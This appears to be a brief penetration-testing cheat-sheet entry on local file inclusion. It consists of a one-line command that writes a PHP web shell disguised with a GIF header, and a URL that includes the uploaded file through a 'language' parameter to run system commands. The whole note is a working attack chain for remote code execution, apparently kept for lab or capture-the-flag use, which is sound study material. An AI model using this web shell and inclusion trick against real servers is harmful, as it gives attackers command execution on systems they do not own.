# LFI


```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

access via url to get RCE
```
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```